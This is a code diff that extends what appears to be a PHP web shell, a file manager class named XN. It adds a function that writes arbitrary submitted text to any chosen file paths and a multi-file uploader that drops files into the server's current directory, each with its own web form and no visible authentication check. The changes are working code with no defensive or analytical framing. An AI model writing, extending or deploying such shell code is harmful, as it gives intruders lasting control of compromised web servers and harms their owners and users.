@@ -4,6 +4,7 @@ date_default_timezone_set("Asia/Jakarta");
 class XN {
     public static $array;
     public static $owner;
+    public static $uplaod;
     public static $group;
     public static $handle;
     public static $directory;
@@ -113,16 +114,26 @@ class XN {
         }
     }
     public static function sortname($filename, $type) {
-        switch ($type) {
-            case "1":
-                if (strlen($filename) > 50) {
-                    $result = substr($filename, 0, 50)."...";
+            switch ($type) {
+                case "1":
+                    if (strlen($filename) > 50) {
+                        $result = substr($filename, 0, 50)."...";
+                    } else {
+                        $result = $filename;
+                    }
+                    break;
+            } return $result;
+        }
+        public static function addFile($filename, $data) {
+            foreach ($filename as $value) {
+                $handle = fopen($value, "w");
+                if (fwrite($handle, $data)) {
+                    print("success");
                 } else {
-                    $result = $filename;
+                    print("failed");
                 }
-                break;
-        } return $result;
-    }
+            }
+        }
     public static function delete($filename) {
         if (is_dir($filename)) {
             $scandir = scandir($filename);
@@ -179,6 +190,16 @@ class XN {
     }
     public static function countDir($filename) {
         return @count(scandir($filename)) -2;
+    }
+    public static function upload($filename) {
+        $files = count($filename['tmp_name']);
+        for ($i=1; $i < $files ; $i++) { 
+            if (move_uploaded_file ($filename['tmp_name'][$i], getcwd(). DIRECTORY_SEPARATOR .$filename['name'][$i])) {
+                alert($i. " File Uploaded");
+            } else {
+                alert("Upload Failed/Permission Danied");
+            }
+        }
     }
     public static function formatSize( $bytes ){
         $types = array( 'Byte', 'KB', 'MB', 'GB', 'TB' );
@@ -243,7 +264,7 @@ function head($x, $y, $class = null) {
                     </button>
                 </li>
                 <li>
-                    <button name="action" value="">
+                    <button name="action" value="upload">
                         <div class="icon">
                             <a><i class="fa fa-upload" aria-hidden="true"></i></a>
                         </div>
@@ -253,7 +274,9 @@ function head($x, $y, $class = null) {
                     </button>
                 </li>
                 <li>
-                    <button name="action" value="">
+                    <button type="button" onclick="$(document).ready(function () {  
+                        jqxAlert.alert('maintenance');  
+                    })">
                         <div class="icon">
                             <a><i class="fa fa-plus-square" aria-hidden="true"></i></a>
                         </div>
@@ -263,7 +286,9 @@ function head($x, $y, $class = null) {
                     </button>
                 </li>
                 <li>
-                    <button name="action" value="">
+                    <button type="button" onclick="$(document).ready(function () {  
+                        jqxAlert.alert('maintenance');  
+                    })">
                         <div class="icon">
                             <a><i class="fa fa-plus-square" aria-hidden="true"></i></a>
                         </div>
@@ -273,7 +298,9 @@ function head($x, $y, $class = null) {
                     </button>
                 </li>
                 <li>
-                    <button name="action" value="">
+                    <button type="button" onclick="$(document).ready(function () {  
+                        jqxAlert.alert('maintenance');  
+                    })">
                         <div class="icon">
                             <a><i class="fa fa-cog" aria-hidden="true"></i></a>
                         </div>
@@ -406,11 +433,15 @@ function alert($message) {
         height:390px;
 
     }
+    .addfile,
+    .upload,
     .rename,
     .edit {
         padding-left: 25px;
         padding-right: 25px;
     }
+    .addfile table td,
+    .upload table td,
     .rename table td,
     .edit table td {
         padding-top:10px;
@@ -428,6 +459,8 @@ function alert($message) {
         padding-left:10px;
         padding-right: 10px;
     }
+    .addfile input[type=submit],
+    .upload input[type=submit],
     .rename input[type=submit],
     .edit input[type=submit] {
         width: 100%;
@@ -644,7 +677,7 @@ function alert($message) {
      }  
     .jqx-alert-header   {  
         font-weight: bold;
-        width:300px;
+        min-width:300px;
         outline: none;
         border-radius:10px 10px 0px 0px;
         overflow: hidden;  
@@ -718,6 +751,7 @@ function alert($message) {
         }
     }
 </style>
+<script src="https://code.jquery.com/jquery-3.3.1.js"></script>
 <script type="text/javascript" src="http://code.jquery.com/jquery-1.7.2.min.js"></script>
 <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sweetalert2@9"></script>
 <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
@@ -745,6 +779,18 @@ function alert($message) {
                 $('.dropdown-tool').hide();
             }
         });
+    });
+    var max_fields = 10;
+    var x = 1;
+    $(document).on('click', '#add_input', function(e){
+        if(x < max_fields){
+            x++;
+            $('#output').append('<div id=\"out\"><input type=\"text\" name=\"filename[]\"><a href="#" class=\"remove\">remove</a></div></div></div>');
+        }
+        $('#output').on("click",".remove", function(e){
+            e.preventDefault(); $(this).parent('#out').remove(); x--;
+            repeat();
+        })
     });
 </script>
 <script>
@@ -848,6 +894,67 @@ function filterTable() {
             } else {
                 alert("Permission Danied");
             }
+            break;
+        case 'addfile':
+            if (isset($_POST['addfile'])) {
+                XN::addfile($_POST['filename'], $_POST['data']);
+            }
+            head('Add File', getcwd(), 'hidden');
+            ?>
+            <div class="addfile">
+                <table>
+                    <form method="post">
+                        <tr>
+                            <td>
+                                <input type="text" name="filename[]">
+                            </td>
+                            <td><a id="add_input">add</a></td>
+                        </tr>
+                        <tr>
+                            <td colspan="2">
+                                <div id="output"></div>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td colspan="2">
+                                <textarea name="data"></textarea>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td colspan="2">
+                                <input type="submit" name="addfile">
+                                <input type="hidden" name="action" value="addfile">
+                            </td>
+                        </tr>
+                    </form>
+                </table>
+            </div>
+            <?php
+            exit();
+            break;
+        case 'upload':
+            if (isset($_POST['upload'])) {
+                XN::upload($_FILES['file']);
+            }
+            head('Upload', getcwd(), 'hidden');
+            ?>
+            <div class="upload">
+                <table>
+                    <form method="post" enctype="multipart/form-data">
+                        <tr>
+                            <td>
+                                <input type="file" name="file[]" multiple>
+                            </td>
+                            <td>
+                                <input type="submit" name="upload">
+                            </td>
+                        </tr>
+                        <input type="hidden" name="action" value="upload">
+                    </form>
+                </table>
+            </div>
+            <?php
+            exit();
             break;
         case 'rename':
             if (isset($_POST['rename'])) {
